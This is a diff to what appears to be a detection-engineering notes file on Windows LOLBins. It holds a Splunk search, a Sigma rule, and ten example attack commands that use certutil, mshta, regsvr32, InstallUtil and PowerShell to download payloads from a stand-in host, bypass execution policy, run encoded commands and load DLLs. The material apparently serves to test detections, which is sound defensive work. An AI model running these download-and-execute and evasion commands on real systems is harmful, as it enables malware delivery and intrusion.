@@ -605,3 +605,88 @@ sc.exe create MaliciousService binPath= "cmd.exe /c calc.exe"
 
 index=windows (EventCode=4104 OR EventCode=4688) 
 | search CommandLine="*certutil*" OR CommandLine="*mshta*" OR CommandLine="*rundll32*" OR CommandLine="*regsvr32*" OR CommandLine="*wmic*" OR CommandLine="*bitsadmin*" OR CommandLine="*esentutl*" OR CommandLine="*forfiles*" OR CommandLine="*schtasks*"
+
+
+1️⃣ CertUtil (Download & Decode Files)
+powershell
+Copy
+Edit
+certutil.exe -urlcache -f http://example.com/malware.exe C:\Users\Public\malware.exe
+certutil.exe -decode C:\Users\Public\encoded.txt C:\Users\Public\decoded.txt
+2️⃣ Mshta (Execute Malicious Script)
+powershell
+Copy
+Edit
+Start-Process "mshta.exe" "http://example.com/malicious.hta"
+3️⃣ Rundll32 (Execute Remote Payload)
+powershell
+Copy
+Edit
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert('LOLBIN TEST')
+4️⃣ Regsvr32 (Bypass AppLocker & Download Payload)
+powershell
+Copy
+Edit
+regsvr32.exe /s /n /u /i:http://example.com/malicious.sct scrobj.dll
+5️⃣ InstallUtil (Execute Malicious Code)
+powershell
+Copy
+Edit
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Users\Public\payload.dll
+🔹 PowerShell-Specific Execution & Evasion
+6️⃣ Encoded Commands (Base64)
+powershell
+Copy
+Edit
+$cmd = "powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAcABpAG5nAC4AZQB4AGUAIgA="
+Invoke-Expression $cmd
+7️⃣ Invoke-WebRequest (Download a File)
+powershell
+Copy
+Edit
+Invoke-WebRequest -Uri "http://example.com/malware.exe" -OutFile "C:\Users\Public\malware.exe"
+8️⃣ Bypass Execution Policy & Run Script
+powershell
+Copy
+Edit
+powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\script.ps1
+9️⃣ Reflective DLL Injection
+powershell
+Copy
+Edit
+[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('C:\Users\Public\malicious.dll'))
+🔟 WMI Execution (Remote Code Execution)
+powershell
+Copy
+Edit
+Invoke-WmiMethod -Path Win32_Process -Name Create -ArgumentList "calc.exe"
+
+
+title: Detect LOLBins Execution in PowerShell
+id: b324f64d-8f4d-4bcd-8fdd-99a3b81cbbf9
+status: experimental
+description: Detects the execution of suspicious LOLBins via PowerShell
+author: Your Name
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    ParentImage|endswith: '\powershell.exe'
+    Image|endswith:
+      - '\rundll32.exe'
+      - '\mshta.exe'
+      - '\certutil.exe'
+      - '\regsvr32.exe'
+      - '\installutil.exe'
+  condition: selection
+fields:
+  - Image
+  - ParentImage
+  - CommandLine
+  - User
+  - EventID
+level: high
+tags:
+  - attack.defense_evasion
+  - attack.execution
